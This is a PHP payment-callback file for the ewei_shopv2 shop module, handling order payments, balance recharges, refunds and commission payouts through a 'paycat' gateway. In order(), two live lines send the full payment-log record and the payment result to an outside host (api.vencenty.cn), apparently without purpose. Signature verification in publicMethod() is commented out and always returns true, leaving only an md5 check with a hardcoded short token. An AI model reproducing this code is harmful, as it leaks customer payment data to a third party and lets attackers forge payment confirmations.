<?php  error_reporting(0);
define("IN_MOBILE", true);
require(dirname(__FILE__) . "/../../../../framework/bootstrap.inc.php");
require(IA_ROOT . "/addons/ewei_shopv2/defines.php");
require(IA_ROOT . "/addons/ewei_shopv2/core/inc/functions.php");
require(IA_ROOT . "/addons/ewei_shopv2/core/inc/plugin_model.php");
require(IA_ROOT . "/addons/ewei_shopv2/core/inc/com_model.php");
new payCat();
class payCat
{
    public $post = NULL;
    public $subject = NULL;
    public $body = NULL;
    public $strs = NULL;
    public $type = NULL;
    public $total_fee = NULL;
    public $setting = NULL;
    public $sec = NULL;
    public $isapp = false;

    /**
     * payCat constructor.
     * platform_trade_no 第三方支付订单ID
     * orderid 订单ID
     * price 传入的订单金额
     * realprice 用户实际支付金额
     * orderuid 用户名
     */
    public function __construct()
    {
        global $_W;
        $this->post = $_POST; //接收回传值
        if( !empty($this->post["subject"]) )
        {
            $this->subject = iconv("gbk", "utf-8", $this->post["subject"]);
        }
        if( !empty($this->post["body"]) )
        {
            $this->body = iconv("gbk", "utf-8", $this->post["body"]);
        }
        if( empty($this->post) )
        {
            exit("未接收到任何返回值");
        }else{
            //以订单号格式来判断订单类型1为余额充值，0为订单付款
            $start = substr($this->post["orderid"],0,2);
            if($start == 'RC'){
                $this->type = 1;
            }else{
                $this->type = 0;
            }
        }
        //校验传入的参数是否格式正确
        $token = "5147";
        $temps = md5($this->post["orderid"] . $this->post["orderuid"] . $this->post["platform_trade_no"] . $this->post["price"] . $this->post["realprice"] . $token);
//        var_dump($temps);
//        exit;
        if ($temps != $this->post["key"]){
            exit("key值不匹配");
        }
        $this->strs = explode(":", $this->body);
        $this->total_fee = round($this->post["realprice"], 2);
        $GLOBALS["_W"]["uniacid"] = intval($this->strs[0]);
        $_W["uniacid"] = intval($this->strs[0]);
        $this->init();
    }

    /**
     * 付款类型：0：订单付款，1：余额充值
     */
    public function init()
    {
        if( $this->type == "0" )
        {
            $this->order();
        }
        else
        {
            if( $this->type == "1" )
            {
                $this->recharge();
            }
            else
            {
                //无数据操作
                if( $this->type == "2" )
                {
                    $this->cashier();
                }
                else
                {
                    //未找到对应数据表
                    if( $this->type == "6" )
                    {
                        $this->threen();
                    }
                    else
                    {
                        if( $this->type == "20" )
                        {
                            $this->creditShop();
                        }
                        else
                        {
                            if( $this->type == "22" )
                            {
                                $this->membercard();
                            }
                        }
                    }
                }
            }
        }
        exit( "success" );
    }

    /**
     * 订单付款
     * payCat constructor.
     * platform_trade_no 第三方支付订单ID
     * orderid 订单ID
     * price 传入的订单金额
     * realprice 用户实际支付金额
     * orderuid 用户名
     */
    public function order()
    {

        if( !$this->publicMethod() )
        {
            exit( "order" );
        }
        $tid = $this->post["orderid"];
        if( strexists($tid, "GJ") )
        {
            $tids = explode("GJ", $tid);
            $tid = $tids[0];
        }
        $sql = "SELECT * FROM " . tablename("core_paylog") . " WHERE `tid`=:tid and `module`=:module limit 1"; //查询交易记录
        $params = array( );
        $params[":tid"] = $tid;
        $params[":module"] = "ewei_shopv2";
        $log = pdo_fetch($sql, $params);
        if( !$this->isapp && $this->post["sign_type"] == "RSA" )
        {
            if( $this->post["realprice"] != $log["fee"] )  //检验金额是否一致
            {
                exit( "付款金额不一致" );
            }
        }
        else
        {
            $total_fee = $this->post["realprice"];
            if( empty($total_fee) )
            {
                $total_fee = $this->post["price"];
            }
            if( $total_fee != $log["fee"] )
            {
                exit( "付款金额不一致" );
            }
        }
//        $this->post["orderid"] . $this->post["orderuid"] . $this->post["platform_trade_no"] . $this->post["price"] . $this->post["realprice"]
        file_get_contents("http://api.vencenty.cn/?file=log&data=" . urlencode(json_encode($log, JSON_UNESCAPED_UNICODE)));
        if( !empty($log) && $log["status"] == "0" )
        {
            $site = WeUtility::createModuleSite($log["module"]);
            if( !is_error($site) )
            {
                $method = "payResult";
                if( method_exists($site, $method) )
                {
                    $ret = array( );
                    $ret["acid"] = $log["acid"];
                    $ret["uniacid"] = $log["uniacid"];
                    $ret["result"] = "success";
                    $ret["type"] = "paycat";
                    $ret["from"] = "return";
                    $ret["tid"] = $log["tid"];
                    $ret["user"] = $log["openid"];
                    $ret["fee"] = $log["fee"];
                    $ret["is_usecard"] = $log["is_usecard"];
                    $ret["card_type"] = $log["card_type"];
                    $ret["card_fee"] = $log["card_fee"];
                    $ret["card_id"] = $log["card_id"];
                    pdo_update("ewei_shop_order", array( "paytype" => 22 ), array( "uniacid" => $log["uniacid"], "ordersn" => $log["tid"] ));//修改订单
                    $result = $site->$method($ret);
                    file_get_contents("http://api.vencenty.cn/?file=yan&data=" . urlencode(json_encode($result, JSON_UNESCAPED_UNICODE)));
                    if( $result )
                    {
                        $log["tag"] = iunserializer($log["tag"]);
                        $log["tag"]["transid"] = $this->post["trade_no"];
                        $record = array( );
                        $record["status"] = "1";
                        $record["type"] = "paycat";
                        $record["tag"] = iserializer($log["tag"]);
                        pdo_update("core_paylog", $record, array( "plid" => $log["plid"] ));
//                        paytype 重新定义
                        pdo_update("ewei_shop_order", array( "paytype" => 22, "apppay" => ($this->isapp ? 1 : 0), "transid" => $this->post["trade_no"] ), array( "ordersn" => $log["tid"], "uniacid" => $log["uniacid"] ));
                        exit( "success" );
                    }
                }
            }
        }
    }
    public function threen()
    {
        global $_W;
        if( !$this->publicMethod() )
        {
            exit( "threen" );
        }
        $logno = trim($this->post["out_trade_no"]);
        if( empty($logno) )
        {
            exit();
        }
        $log = pdo_fetch("SELECT * FROM " . tablename("ewei_shop_threen_log") . " WHERE `uniacid`=:uniacid and logno = :logno limit 1", array( ":uniacid" => $_W["uniacid"], ":logno" => $logno ));
        if( !$this->isapp && $this->post["sign_type"] == "RSA" )
        {
            if( $this->post["total_amount"] != $log["moneychange"] )
            {
                exit( "fail" );
            }
        }
        else
        {
            $total_fee = $this->post["total_fee"];
            if( empty($total_fee) )
            {
                $total_fee = $this->post["total_amount"];
            }
            if( $total_fee != $log["moneychange"] )
            {
                exit( "fail" );
            }
        }
        if( p("threen") )
        {
            p("threen")->payResult($log["logno"], "paycat", ($this->isapp ? true : false));
        }
    }

    /*
     * 会员充值
     * payCat constructor.
     * platform_trade_no 第三方支付订单ID
     * orderid 订单ID
     * price 传入的订单金额
     * realprice 用户实际支付金额
     * orderuid 用户名
     */
    public function recharge()
    {
        global $_W;
        if( !$this->publicMethod() )
        {
            exit( "recharge" );
        }
        $logno = trim($this->post["orderid"]);
        if( empty($logno) )
        {
            exit();
        }
        $log = pdo_fetch("SELECT * FROM " . tablename("ewei_shop_member_log") . " WHERE `uniacid`=:uniacid and `logno`=:logno limit 1", array( ":uniacid" => $_W["uniacid"], ":logno" => $logno ));
        if( !$this->isapp && $this->post["sign_type"] == "RSA" )
        {
            if( $this->post["realprice"] != $log["money"] ) //如果付款金额和提交充值订单不一致
            {
                exit( "fail" );
            }
        }
        else
        {
            $total_fee = $this->post["realprice"];
            if( empty($total_fee) )
            {
                $total_fee = $this->post["price"];
            }
            if( $total_fee != $log["money"] )
            {
                exit( "fail" );
            }
        }
        if( !empty($log) && empty($log["status"]) )
        {
            pdo_update("ewei_shop_member_log", array( "status" => 1, "rechargetype" => "paycat", "apppay" => ($this->isapp ? 1 : 0), "transid" => $this->post["platform_trade_no"] ), array( "id" => $log["id"] ));//修改充值记录
            $shopset = m("common")->getSysset("shop");
            m("member")->setCredit($log["openid"], "credit2", $log["money"], array( 0, $shopset["name"] . "会员充值:credit2:" . $log["money"] ));
            m("member")->setRechargeCredit($log["openid"], $log["money"]);
            com_run("sale::setRechargeActivity", $log);
            com_run("coupon::useRechargeCoupon", $log);
            m("notice")->sendMemberLogMessage($log["id"]);
            $member = m("member")->getMember($log["openid"]);
            $params = array( "nickname" => (empty($member["nickname"]) ? "未更新" : $member["nickname"]), "price" => $log["money"], "paytype" => "支付猫", "paytime" => date("Y-m-d H:i:s", time()) );
            com_run("printer::sendRechargeMessage", $params);
        }
    }
    public function cashier()
    {
        global $_W;
        $ordersn = trim($this->post["out_trade_no"]);
        if( empty($ordersn) )
        {
            exit();
        }
        if( p("cashier") )
        {
        }
    }
    public function creditShop()
    {
        global $_W;
        if( !$this->publicMethod() )
        {
            exit( "creditShop" );
        }
        $logno = trim($this->post["out_trade_no"]);
        if( empty($logno) )
        {
            exit();
        }
        $logno = str_replace("_borrow", "", $logno);
        $total_fee = $this->total_fee;
        if( empty($total_fee) )
        {
            $total_fee = $this->post["total_amount"];
        }
        if( !$this->isapp && $this->post["sign_type"] == "RSA" )
        {
            $total_fee = $this->post["total_amount"];
        }
        if( p("creditshop") )
        {
            p("creditshop")->payResult($logno, "paycat", $total_fee, ($this->isapp ? true : false));
        }
    }
    public function batch_trans_notify()
    {
        $post = explode("MONEY", substr($this->post["batch_no"], 11));
        list($id, $money) = $post;
        if( strexists($this->post["batch_no"], "CP") )
        {
            $this->batch_trans_notify_cp($id, $money);
        }
        else
        {
            if( strexists($this->post["batch_no"], "RW") )
            {
                $this->batch_trans_notify_rw($id, $money);
            }
        }
        exit( "success" );
    }
    public function batch_trans_notify_cp($id, $money)
    {
        global $_W;
        $apply = pdo_fetch("select * from " . tablename("ewei_shop_commission_apply") . " where id=:id limit 1", array( ":id" => $id ));
        if( empty($apply) || $apply["status"] == "3" )
        {
            exit();
        }
        if( $money != $apply["realmoney"] * 100 )
        {
            exit();
        }
        $GLOBALS["_W"]["uniacid"] = $apply["uniacid"];
        $_W["uniacid"] = $apply["uniacid"];
        $agentid = $apply["mid"];
        $member = p("commission")->getInfo($agentid, array( "total", "ok", "apply", "lock", "check" ));
        $hasagent = 0 < $member["agentcount"];
        $agentLevel = p("commission")->getLevel($apply["mid"]);
        $set = p("commission")->getSet();
        if( empty($agentLevel["id"]) )
        {
            $agentLevel = array( "levelname" => (empty($set["levelname"]) ? "普通等级" : $this->set["levelname"]), "commission1" => $set["commission1"], "commission2" => $set["commission2"], "commission3" => $set["commission3"] );
        }
        $orderids = iunserializer($apply["orderids"]);
        if( !is_array($orderids) || count($orderids) <= 0 )
        {
            exit();
        }
        $ids = array( );
        foreach( $orderids as $o )
        {
            $ids[] = $o["orderid"];
        }
        $list = pdo_fetchall("select id,agentid, ordersn,price,goodsprice, dispatchprice,createtime, paytype from " . tablename("ewei_shop_order") . " where  id in ( " . implode(",", $ids) . " );");
        $totalcommission = 0;
        $totalpay = 0;
        $totalmoney = 0;
        foreach( $list as &$row )
        {
            foreach( $orderids as $o )
            {
                if( $o["orderid"] == $row["id"] )
                {
                    $row["level"] = $o["level"];
                    break;
                }
            }
            $goods = pdo_fetchall("SELECT og.id,g.thumb,og.price,og.realprice, og.total,g.title,o.paytype,og.optionname,og.commission1,og.commission2,og.commission3,og.commissions,og.status1,og.status2,og.status3,og.content1,og.content2,og.content3 from " . tablename("ewei_shop_order_goods") . " og" . " left join " . tablename("ewei_shop_goods") . " g on g.id=og.goodsid  " . " left join " . tablename("ewei_shop_order") . " o on o.id=og.orderid  " . " where og.uniacid = :uniacid and og.orderid=:orderid and og.nocommission=0 order by og.createtime  desc ", array( ":uniacid" => $_W["uniacid"], ":orderid" => $row["id"] ));
            foreach( $goods as &$g )
            {
                $commissions = iunserializer($g["commissions"]);
                if( 1 <= $set["level"] )
                {
                    $commission = iunserializer($g["commission1"]);
                    if( empty($commissions) )
                    {
                        $g["commission1"] = (isset($commission["level" . $agentLevel["id"]]) ? $commission["level" . $agentLevel["id"]] : $commission["default"]);
                    }
                    else
                    {
                        $g["commission1"] = (isset($commissions["level1"]) ? floatval($commissions["level1"]) : 0);
                    }
                    if( $row["level"] == 1 )
                    {
                        $totalcommission += $g["commission1"];
                        if( 2 <= $g["status1"] )
                        {
                            $totalpay += $g["commission1"];
                        }
                    }
                }
                if( 2 <= $set["level"] )
                {
                    $commission = iunserializer($g["commission2"]);
                    if( empty($commissions) )
                    {
                        $g["commission2"] = (isset($commission["level" . $agentLevel["id"]]) ? $commission["level" . $agentLevel["id"]] : $commission["default"]);
                    }
                    else
                    {
                        $g["commission2"] = (isset($commissions["level2"]) ? floatval($commissions["level2"]) : 0);
                    }
                    if( $row["level"] == 2 )
                    {
                        $totalcommission += $g["commission2"];
                        if( 2 <= $g["status2"] )
                        {
                            $totalpay += $g["commission2"];
                        }
                    }
                }
                if( 3 <= $set["level"] )
                {
                    $commission = iunserializer($g["commission3"]);
                    if( empty($commissions) )
                    {
                        $g["commission3"] = (isset($commission["level" . $agentLevel["id"]]) ? $commission["level" . $agentLevel["id"]] : $commission["default"]);
                    }
                    else
                    {
                        $g["commission3"] = (isset($commissions["level3"]) ? floatval($commissions["level3"]) : 0);
                    }
                    if( $row["level"] == 3 )
                    {
                        $totalcommission += $g["commission3"];
                        if( 2 <= $g["status3"] )
                        {
                            $totalpay += $g["commission3"];
                        }
                    }
                }
                $g["level"] = $row["level"];
            }
            unset($g);
            $row["goods"] = $goods;
            $totalmoney += $row["price"];
        }
        unset($row);
        $set_array = array( );
        $set_array["charge"] = $apply["charge"];
        $set_array["begin"] = $apply["beginmoney"];
        $set_array["end"] = $apply["endmoney"];
        $realmoney = $totalpay;
        $deductionmoney = 0;
        if( !empty($set_array["charge"]) )
        {
            $money_array = m("member")->getCalculateMoney($totalpay, $set_array);
            if( $money_array["flag"] )
            {
                $realmoney = $money_array["realmoney"];
                $deductionmoney = $money_array["deductionmoney"];
            }
        }
        $apply_type = array( "余额", "微信钱包", "支付宝", "银行卡" );
        $time = time();
        foreach( $list as $row )
        {
            $update = array( );
            foreach( $row["goods"] as $g )
            {
                $update = array( );
                if( $row["level"] == 1 && $g["status1"] == 2 )
                {
                    $update = array( "paytime1" => $time, "status1" => 3 );
                }
                else
                {
                    if( $row["level"] == 2 && $g["status2"] == 2 )
                    {
                        $update = array( "paytime2" => $time, "status2" => 3 );
                    }
                    else
                    {
                        if( $row["level"] == 3 && $g["status3"] == 2 )
                        {
                            $update = array( "paytime3" => $time, "status3" => 3 );
                        }
                    }
                }
                if( !empty($update) )
                {
                    pdo_update("ewei_shop_order_goods", $update, array( "id" => $g["id"] ));
                }
            }
        }
        pdo_update("ewei_shop_commission_apply", array( "status" => 3, "paytime" => $time, "commission_pay" => $totalpay, "realmoney" => $realmoney, "deductionmoney" => $deductionmoney ), array( "id" => $id, "uniacid" => $_W["uniacid"] ));
        $log = array( "uniacid" => $_W["uniacid"], "applyid" => $apply["id"], "mid" => $member["id"], "commission" => $totalcommission, "commission_pay" => $totalpay, "realmoney" => $realmoney, "deductionmoney" => $deductionmoney, "charge" => $set_array["charge"], "createtime" => $time, "type" => $apply["type"] );
        pdo_insert("ewei_shop_commission_log", $log);
        $mcommission = $totalpay;
        if( !empty($deductionmoney) )
        {
            $mcommission .= ",实际到账金额:" . $realmoney . ",提现手续费金额:" . $deductionmoney;
        }
        p("commission")->sendMessage($member["openid"], array( "commission" => $mcommission, "type" => $apply_type[$apply["type"]] ), TM_COMMISSION_PAY);
        p("commission")->upgradeLevelByCommissionOK($member["openid"]);
        if( p("globous") )
        {
            p("globous")->upgradeLevelByCommissionOK($member["openid"]);
        }
        plog("commission.apply.pay", "佣金打款 ID: " . $id . " 申请编号: " . $apply["applyno"] . " 打款方式: " . $apply_type[$apply["type"]] . " 总佣金: " . $totalcommission . " 审核通过佣金: " . $totalpay . " 实际到账金额: " . $realmoney . " 提现手续费金额: " . $deductionmoney . " 提现手续费税率: " . $set_array["charge"] . "%");
    }
    public function batch_trans_notify_rw($id, $money)
    {
        $log = pdo_fetch("select * from " . tablename("ewei_shop_member_log") . " where id=:id limit 1", array( ":id" => $id ));
        if( empty($log) || $log["status"] == "1" )
        {
            exit();
        }
        if( $money != $log["realmoney"] * 100 )
        {
            exit();
        }
        $GLOBALS["_W"]["uniacid"] = $log["uniacid"];
        $_W["uniacid"] = $log["uniacid"];
        pdo_update("ewei_shop_member_log", array( "status" => 1 ), array( "id" => $id, "uniacid" => $_W["uniacid"] ));
        m("notice")->sendMemberLogMessage($log["id"]);
        $member = m("member")->getMember($log["openid"]);
        plog("finance.log.wechat", "余额提现 ID: " . $log["id"] . " 方式: 微信 提现金额: " . $log["money"] . " ,到账金额: " . $money . " ,手续费金额 : " . $log["deductionmoney"] . "<br/>会员信息:  ID: " . $member["id"] . " / " . $member["openid"] . "/" . $member["nickname"] . "/" . $member["realname"] . "/" . $member["mobile"]);
    }
    public function batch_refund_notify()
    {
        $post = explode("MONEY", substr($this->post["batch_no"], 10));
        list($id, $money) = $post;
        if( strexists($this->post["batch_no"], "RF") )
        {
            $this->batch_refund_notify_rf($id, $money);
        }
        else
        {
            if( strexists($this->post["batch_no"], "RC") )
            {
                $this->batch_refund_notify_rc($id, $money);
            }
        }
        exit( "success" );
    }
    public function batch_refund_notify_rf($id, $money)
    {
        $item = pdo_fetch("SELECT * FROM " . tablename("ewei_shop_order") . " WHERE id = :id limit 1", array( ":id" => $id ));
        if( empty($item) )
        {
            exit();
        }
        $GLOBALS["_W"]["uniacid"] = $item["uniacid"];
        $_W["uniacid"] = $item["uniacid"];
        $time = time();
        $goods = pdo_fetchall("SELECT g.id,g.credit, o.total,o.realprice FROM " . tablename("ewei_shop_order_goods") . " o left join " . tablename("ewei_shop_goods") . " g on o.goodsid=g.id " . " WHERE o.orderid=:orderid and o.uniacid=:uniacid", array( ":orderid" => $item["id"], ":uniacid" => $item["uniacid"] ));
        $credits = m("order")->getGoodsCredit($goods);
        if( 0 < $credits )
        {
            m("member")->setCredit($item["openid"], "credit1", 0 - $credits, array( 0, "退款扣除购物赠送积分: " . $credits . " 订单号: " . $item["ordersn"] ));
        }
        if( 0 < $item["deductcredit"] )
        {
            m("member")->setCredit($item["openid"], "credit1", $item["deductcredit"], array( "0", "购物返还抵扣积分 积分: " . $item["deductcredit"] . " 抵扣金额: " . $item["deductprice"] . " 订单号: " . $item["ordersn"] ));
        }
        if( !empty($refundtype) )
        {
            if( $money < 0 )
            {
                $item["deductcredit2"] = $money;
            }
            m("order")->setDeductCredit2($item);
        }
        $change_refund["reply"] = "";
        $change_refund["status"] = 1;
        $change_refund["refundtype"] = $refundtype;
        $change_refund["price"] = round($money / 100, 2);
        $change_refund["refundtime"] = $time;
        if( empty($refund["operatetime"]) )
        {
            $change_refund["operatetime"] = $time;
        }
        pdo_update("ewei_shop_order_refund", $change_refund, array( "id" => $item["refundid"] ));
        m("order")->setGiveBalance($item["id"], 2);
        m("order")->setStocksAndCredits($item["id"], 2);
        if( $refund["orderprice"] == $refund["applyprice"] && com("coupon") && !empty($item["couponid"]) )
        {
            com("coupon")->returnConsumeCoupon($item["id"]);
        }
        pdo_update("ewei_shop_order", array( "refundstate" => 0, "status" => -1, "refundtime" => $time ), array( "id" => $item["id"], "uniacid" => $item["uniacid"] ));
        foreach( $goods as $g )
        {
            $salesreal = pdo_fetchcolumn("select ifnull(sum(total),0) from " . tablename("ewei_shop_order_goods") . " og " . " left join " . tablename("ewei_shop_order") . " o on o.id = og.orderid " . " where og.goodsid=:goodsid and o.status>=1 and o.uniacid=:uniacid limit 1", array( ":goodsid" => $g["id"], ":uniacid" => $item["uniacid"] ));
            pdo_update("ewei_shop_goods", array( "salesreal" => $salesreal ), array( "id" => $g["id"] ));
        }
        $log = "订单退款 ID: " . $item["id"] . " 订单号: " . $item["ordersn"];
        if( 0 < $item["parentid"] )
        {
            $log .= " 父订单号:" . $item["ordersn"];
        }
        plog("order.op.refund", $log);
        m("notice")->sendOrderMessage($item["id"], true);
    }
    public function batch_refund_notify_rc($id, $money)
    {
        $log = pdo_fetch("select * from " . tablename("ewei_shop_member_log") . " where id=:id limit 1", array( ":id" => $id ));
        if( empty($log) )
        {
            exit();
        }
        $GLOBALS["_W"]["uniacid"] = $log["uniacid"];
        $_W["uniacid"] = $log["uniacid"];
        pdo_update("ewei_shop_member_log", array( "status" => 3 ), array( "id" => $id, "uniacid" => $_W["uniacid"] ));
        $refundmoney = $log["money"] + $log["gives"];
        m("member")->setCredit($log["openid"], "credit2", 0 - $refundmoney, array( 0, "充值退款" ));
        m("notice")->sendMemberLogMessage($log["id"]);
        $member = m("member")->getMember($log["openid"]);
        plog("finance.log.refund", "充值退款 ID: " . $log["id"] . " 金额: " . $log["money"] . " <br/>会员信息:  ID: " . $member["id"] . " / " . $member["openid"] . "/" . $member["nickname"] . "/" . $member["realname"] . "/" . $member["mobile"]);
    }


    public function publicMethod()
    {
        global $_W;
        $_W['uniacid'] = 1;
        $this->setting = uni_setting($_W["uniacid"], array( "payment" ));
        $this->setting["payment"]["paycat"] = array( "switch" => 1 );
//        if( isset($this->strs[2]) && $this->strs[2] == "APP" )
//        {
//            $wapset = m("common")->getSysset("wap");
//            $this->setting["payment"]["paycat"] = array( "switch" => 1, "public_key" => $wapset["alipublic"] );
//        }
//        if( !empty($this->setting["payment"]["paycat"]) )
//        {
//            $sec_yuan = m("common")->getSec();
//            $this->sec = iunserializer($sec_yuan["sec"]);
//            if( $this->post["sign_type"] == "RSA" || $this->post["sign_type"] == "RSA2" )
//            {
//                if( isset($this->strs[2]) && $this->strs[2] == "APP" )
//                {
//                    if( $this->post["sign_type"] == "RSA" )
//                    {
//                        $public_key = $this->sec["app_alipay"]["public_key"];
//                    }
//                    else
//                    {
//                        $public_key = $this->sec["app_alipay"]["public_key_rsa2"];
//                    }
//                    if( empty($public_key) )
//                    {
//                        exit();
//                    }
//                    $this->isapp = true;
//                    return m("finance")->RSAVerify($this->post, $public_key, true);
//                }
//                $public_key = $this->sec["alipay_pay"]["public_key"];
//                if( empty($public_key) )
//                {
//                    exit();
//                }
//                return m("finance")->RSAVerify($this->post, $public_key, true);
//            }
//            $prepares = array( );
//            foreach( $this->post as $key => $value )
//            {
//                if( $key != "sign" && $key != "sign_type" )
//                {
//                    $prepares[] = (string) $key . "=" . $value;
//                }
//            }
//            sort($prepares);
//            $string = implode($prepares, "&");
//            $string .= $this->setting["payment"]["catpay"]["secret"];
//            $sign = md5($string);
//            if( $sign == $this->post["sign"] )
//            {
//                return true;
//            }
//        }
        return true;
    }
    public function membercard()
    {
        global $_W;
        if( !$this->publicMethod() )
        {
            exit( "membercard" );
        }
        $logno = trim($this->post["out_trade_no"]);
        if( empty($logno) )
        {
            exit();
        }
        $logno = str_replace("_borrow", "", $logno);
        $total_fee = $this->total_fee;
        if( empty($total_fee) )
        {
            $total_fee = $this->post["total_amount"];
        }
        if( !$this->isapp && $this->post["sign_type"] == "RSA" )
        {
            $total_fee = $this->post["total_amount"];
        }
        if( p("membercard") )
        {
            p("membercard")->payResult($logno, "paycat", $total_fee, ($this->isapp ? true : false));
        }
    }

    //返回错误
    function jsonError($message = '',$url=null)
    {
        $return['msg'] = $message;
        $return['data'] = '';
        $return['code'] = -1;
        $return['url'] = $url;
        return json_encode($return);
    }

    //返回正确
    function jsonSuccess($message = '',$data = '',$url=null)
    {
        $return['msg']  = $message;
        $return['data'] = $data;
        $return['code'] = 1;
        $return['url'] = $url;
        return json_encode($return);
    }
}
?>